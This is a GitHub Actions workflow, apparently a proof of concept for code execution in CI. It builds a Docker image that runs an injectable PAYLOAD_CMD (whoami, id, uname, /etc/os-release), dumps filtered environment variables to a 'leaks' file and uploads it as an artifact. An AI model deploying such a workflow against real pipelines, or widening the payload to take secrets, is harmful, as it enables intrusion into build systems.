name: Safe CI RCE Demonstration

on:
  push:
    branches:
      - main

jobs:
  safe-ci-exploit:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Prepare Dockerfile
        run: |
          mkdir -p ./taskcluster/docker/python
          cat <<'EOF' > ./taskcluster/docker/python/Dockerfile
FROM python:3.11-alpine

ARG PAYLOAD_CMD="whoami && id && uname -a && cat /etc/os-release"
ARG MARKER="=== CI EXECUTION SUCCESSFUL ==="

RUN apk add --no-cache curl bash coreutils grep \
  && echo "[+] Building Docker image safely..." \
  && echo "$MARKER" > /leaks.txt \
  && echo "[+] Executing PAYLOAD_CMD..." >> /leaks.txt \
  && sh -c "$PAYLOAD_CMD" >> /leaks.txt \
  && echo "[+] ENV Dump (safe vars only)..." >> /leaks.txt \
  && env | grep -v -e 'GITHUB_' -e 'OIDC' -e 'AWS' >> /leaks.txt \
  && echo "[+] Finished successfully." >> /leaks.txt
EOF

      - name: Build Docker Image and Extract Leak
        run: |
          docker build \
            --build-arg PAYLOAD_CMD="whoami && id && uname -a && cat /etc/os-release" \
            --build-arg MARKER="SAFE_CI_PROOF" \
            -t safeproof \
            ./taskcluster/docker/python

          docker run --rm safeproof cat /leaks.txt > leaks.txt

      - name: Upload Leak Artifact
        uses: actions/upload-artifact@v4
        with:
          name: safe-ci-leak-proof
          path: leaks.txt
